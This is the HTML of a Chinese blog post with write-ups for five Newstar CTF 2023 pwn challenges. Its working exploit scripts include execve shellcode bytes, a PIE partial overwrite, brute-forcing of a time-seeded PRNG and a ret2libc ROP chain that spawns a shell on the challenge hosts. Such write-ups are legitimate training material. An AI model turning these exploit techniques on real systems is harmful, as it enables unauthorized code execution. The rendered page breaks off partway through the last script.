@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Newstar CTF 2023 pwn | Smera1d0&#39;s Blog</title>
+<meta name="keywords" content="CTF">
+<meta name="description" content="1.ezshellcode
+直接sendline(shellcode)即可
+exp：
+from pwn import *
+p = remote(&#34;node4.buuoj.cn&#34;,29374)
+#p = process(&#39;/home/miyu/Desktop/ezshellcode&#39;)
+
+context(log_level = &#39;debug&#39;, arch = &#39;amd64&#39;, os = &#39;linux&#39;)
+shellcode=asm(shellcraft.sh())
+#shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39;
+payload = shellcode
+p.sendlineafter(&#39;Show me your magic\n&#39;,payload)
+p.interactive()
+pwntools生成的shellcode和\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05都能过">
+<meta name="author" content="Mi Yu">
+<link rel="canonical" href="https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/">
+<meta name="google-site-verification" content="JEK1eXuLRduZRvpZ01WxuqtEwCBXrfSU3TuSjv3xrTI">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.02238dc96288a65dfaca39b68daacacd93ec4a054c36ef271e4004953dbb23e7.css" integrity="sha256-AiONyWKIpl36yjm2jarKzZPsSgVMNu8nHkAElT27I&#43;c=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://smera1d0.github.io/images/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://smera1d0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://smera1d0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://smera1d0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://smera1d0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.js" integrity="sha384-Qsn9KnoKISj6dI8g7p1HBlNpVx0I8p1SvlwOldgi3IorMle61nQy4zEahWYtljaz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          
+          
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false}
+          ],
+          
+          throwOnError : false
+        });
+    });
+</script><meta property="og:title" content="Newstar CTF 2023 pwn" />
+<meta property="og:description" content="1.ezshellcode
+直接sendline(shellcode)即可
+exp：
+from pwn import *
+p = remote(&#34;node4.buuoj.cn&#34;,29374)
+#p = process(&#39;/home/miyu/Desktop/ezshellcode&#39;)
+
+context(log_level = &#39;debug&#39;, arch = &#39;amd64&#39;, os = &#39;linux&#39;)
+shellcode=asm(shellcraft.sh())
+#shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39;
+payload = shellcode
+p.sendlineafter(&#39;Show me your magic\n&#39;,payload)
+p.interactive()
+pwntools生成的shellcode和\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05都能过" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/" /><meta property="og:image" content="https://smera1d0.github.io/images/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-10-17T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://smera1d0.github.io/images/papermod-cover.png"/>
+
+<meta name="twitter:title" content="Newstar CTF 2023 pwn"/>
+<meta name="twitter:description" content="1.ezshellcode
+直接sendline(shellcode)即可
+exp：
+from pwn import *
+p = remote(&#34;node4.buuoj.cn&#34;,29374)
+#p = process(&#39;/home/miyu/Desktop/ezshellcode&#39;)
+
+context(log_level = &#39;debug&#39;, arch = &#39;amd64&#39;, os = &#39;linux&#39;)
+shellcode=asm(shellcraft.sh())
+#shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39;
+payload = shellcode
+p.sendlineafter(&#39;Show me your magic\n&#39;,payload)
+p.interactive()
+pwntools生成的shellcode和\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05都能过"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://smera1d0.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Newstar CTF 2023 pwn",
+      "item": "https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Newstar CTF 2023 pwn",
+  "name": "Newstar CTF 2023 pwn",
+  "description": "1.ezshellcode 直接sendline(shellcode)即可 exp：\nfrom pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;,29374) #p = process(\u0026#39;/home/miyu/Desktop/ezshellcode\u0026#39;) context(log_level = \u0026#39;debug\u0026#39;, arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;) shellcode=asm(shellcraft.sh()) #shellcode = b\u0026#39;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#39; payload = shellcode p.sendlineafter(\u0026#39;Show me your magic\\n\u0026#39;,payload) p.interactive() pwntools生成的shellcode和\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05都能过\n",
+  "keywords": [
+    "CTF"
+  ],
+  "articleBody": "1.ezshellcode 直接sendline(shellcode)即可 exp：\nfrom pwn import * p = remote(\"node4.buuoj.cn\",29374) #p = process('/home/miyu/Desktop/ezshellcode') context(log_level = 'debug', arch = 'amd64', os = 'linux') shellcode=asm(shellcraft.sh()) #shellcode = b'\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05' payload = shellcode p.sendlineafter('Show me your magic\\n',payload) p.interactive() pwntools生成的shellcode和\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05都能过\n2.p1eee 开启了PIE，地址的后三位（1.5字节）是随机的\n发现了system(/bin/sh)，于是我们直接把后两个字节改为126C即可 exp：\nfrom pwn import * #p = process('/home/miyu/Desktop/pwn (4)') p = remote(\"node4.buuoj.cn\",29573) #gdb.attach(p) offset = 0x20+8 p.sendline(b'a'*offset+p64(0x126C)) p.interactive() 3.newstar shop 通过购买机制让金钱变成负值即可，然后int型变量转化为unsigned int型变量即可进入后门\n4.Random 以时间作为随机数种子，生成了v8，然后要求我们输入v6，当v8=v6时才能进入if里，我们可以使用与远程环境一样的libc版本，也以time(0)作为随机数种子\nlibc = cdll.LoadLibrary('libc.so.6')\rlibc.srand(libc.time(0))\ra=libc.random()\rp.sendline(str(a)) 我们需要让v4%2=1,v3='0'才可以构造出system($0) system($0)是和system(/bin/sh)等价的 所以我们要对后两位随机数进行爆破，直到满足v4%2=1,v3='0'为止 每次爆破后需要暂停一秒，以刷新时间种子\n完整exp如下：\nfrom pwn import * from LibcSearcher import * from ctypes import * for i in range(100): p = remote(\"node4.buuoj.cn\",27502) libc = cdll.LoadLibrary('libc.so.6') libc.srand(libc.time(0)) try: a=libc.random() b=libc.random() c=libc.random() if b%5==2: if c%2==1: p.sendline(str(a)) p.interactive() except: continue finally: p.close() sleep(1) 关于python中try、except、finally的用法，可以参考：\nhttps://blog.csdn.net/weixin_44828950/article/details/91471459\n5.ret2libc 发现存在pop rdi 观察main函数，可以利用puts函数泄露libc\nfrom pwn import * from LibcSearcher import * context(os=\"linux\", arch=\"amd64\", log_level=\"debug\") elf = ELF('/home/miyu/Desktop/ret2libc') p = remote(\"node4.buuoj.cn\", 28784) pop_ret_rdi = 0x400763 ret = 0x400506 put_got = elf.got['puts'] put_plt = elf.plt['puts'] main_addr = 0x400698 offset = 0x20 + 8 payload = b'a' * offset + p64(pop_ret_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr) p.sendline(payload) puts_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) print(hex(puts_addr)) libc = LibcSearcher(\"puts\", puts_addr) libc_base = puts_addr - libc.dump(\"puts\") system_addr = libc.dump(\"system\") + libc_base binsh_addr = libc.dump(\"str_bin_sh\") + libc_base Payload = b'a' * offset + p64(ret) + p64(pop_ret_rdi) + p64(binsh_addr) + p64(system_addr) p.sendline(Payload) p.interactive() 64位用puts泄露libc 第一次payload泄露libc payload =b’A’*(0x20 +8) +p64(rdi_addr) +p64(elf.got[‘puts’]) +p64(elf.plt[“puts”]) +p64(main_addr)\n第二次payload得shell payload=b’A’*(0x20 +8) +p64(ret_addr) +p64(rdi_addr) +p64(bin_sh) +p64(sys_addr)\nlibc版本选择1，得到flag\n",
+  "wordCount" : "798",
+  "inLanguage": "zh",
+  "datePublished": "2023-10-17T00:00:00Z",
+  "dateModified": "2023-10-17T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mi Yu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Smera1d0's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://smera1d0.github.io/images/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://smera1d0.github.io/" accesskey="h" title="Smera1d0&#39;s Blog (Alt + H)">Smera1d0&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://smera1d0.github.io/en/" title="English"
+                            aria-label="English">English</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://smera1d0.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/cv.pdf" title="CV">
+                    <span>CV</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.cnblogs.com/smera1d0" title="博客园">
+                    <span>博客园</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://smera1d0.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://smera1d0.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Newstar CTF 2023 pwn
+    </h1>
+    <div class="post-meta"><span title='2023-10-17 00:00:00 +0000 UTC'>十月 17, 2023</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Mi Yu&nbsp;|&nbsp;<a href="https://github.com/Smera1d0/Smera1d0.github.io/tree/master" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#1ezshellcode" aria-label="1.ezshellcode">1.ezshellcode</a></li>
+                <li>
+                    <a href="#2p1eee" aria-label="2.p1eee">2.p1eee</a></li>
+                <li>
+                    <a href="#3newstar-shop" aria-label="3.newstar shop">3.newstar shop</a></li>
+                <li>
+                    <a href="#4random" aria-label="4.Random">4.Random</a></li>
+                <li>
+                    <a href="#5ret2libc" aria-label="5.ret2libc">5.ret2libc</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="1ezshellcode">1.ezshellcode<a hidden class="anchor" aria-hidden="true" href="#1ezshellcode">#</a></h2>
+<p>直接<code>sendline(shellcode)</code>即可
+exp：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29374</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#39;/home/miyu/Desktop/ezshellcode&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Show me your magic</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><code>pwntools</code>生成的shellcode和<code>\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</code>都能过</p>
+<h2 id="2p1eee">2.p1eee<a hidden class="anchor" aria-hidden="true" href="#2p1eee">#</a></h2>
+<p><img loading="lazy" src="https://s2.loli.net/2023/10/03/Oac58TonErs1H4Q.png" alt="image.png"  />
+</p>
+<p>开启了<code>PIE</code>，地址的后三位（1.5字节）是随机的</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/10/03/wpdRkDiSYJ8t5Q6.png" alt="image.png"  />
+</p>
+<p>发现了<code>system(/bin/sh)</code>，于是我们直接把后两个字节改为126C即可
+exp：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#39;/home/miyu/Desktop/pwn (4)&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29573</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x126C</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="3newstar-shop">3.newstar shop<a hidden class="anchor" aria-hidden="true" href="#3newstar-shop">#</a></h2>
+<p>通过购买机制让金钱变成负值即可，然后int型变量转化为unsigned int型变量即可进入后门</p>
+<h2 id="4random">4.Random<a hidden class="anchor" aria-hidden="true" href="#4random">#</a></h2>
+<img src="https://s2.loli.net/2023/10/03/rPMg41CQuIq2SVh.png" alt="image.png" style="zoom:80%;" />
+<p>以时间作为随机数种子，生成了v8，然后要求我们输入v6，当<code>v8=v6</code>时才能进入if里，我们可以使用与远程环境一样的libc版本，也以<code>time(0)</code>作为随机数种子</p>
+<pre tabindex="0"><code>libc = cdll.LoadLibrary(&#39;libc.so.6&#39;)
+libc.srand(libc.time(0))
+a=libc.random()
+p.sendline(str(a))
+</code></pre><img src="https://s2.loli.net/2023/10/03/yOBrJ2HGzYnWERt.png" alt="image.png" style="zoom:80%;" />
+<img src="https://s2.loli.net/2023/10/03/Kb8o1NSBrFpEwVX.png" alt="image.png" style="zoom:80%;" />
+<p>我们需要让<code>v4%2=1,v3='0'</code>才可以构造出<code>system($0)</code>
+<code>system($0)</code>是和<code>system(/bin/sh)</code>等价的
+所以我们要对后两位随机数进行爆破，直到满足<code>v4%2=1,v3='0'</code>为止
+每次爆破后需要暂停一秒，以刷新时间种子</p>
+<p>完整exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27502</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">cdll</span><span class="o">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">random</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">random</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">random</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b</span><span class="o">%</span><span class="mi">5</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">c</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>关于python中try、except、finally的用法，可以参考：</p>
+<p><a href="https://blog.csdn.net/weixin_44828950/article/details/91471459">https://blog.csdn.net/weixin_44828950/article/details/91471459</a></p>
+<h2 id="5ret2libc">5.ret2libc<a hidden class="anchor" aria-hidden="true" href="#5ret2libc">#</a></h2>
+<p><img loading="lazy" src="https://s2.loli.net/2023/10/17/VlzYqG5vTUR1WH6.png" alt="image.png"  />
+</p>
+<p>发现存在<code>pop rdi</code>
+<img src="https://s2.loli.net/2023/10/17/HoDQXiOf9Esdh1M.png" alt="image.png" style="zoom:80%;" /></p>
+<p>观察<code>main</code>函数，可以利用<code>puts</code>函数泄露libc</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/home/miyu/Desktop/ret2libc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">28784</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ret_rdi</span> <span class="o">=</span> <span class="mh">0x400763</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400506</span>
+</span></span><span class="line"><span class="cl"><span class="n">put_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">put_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x400698</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_ret_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">put_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">put_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
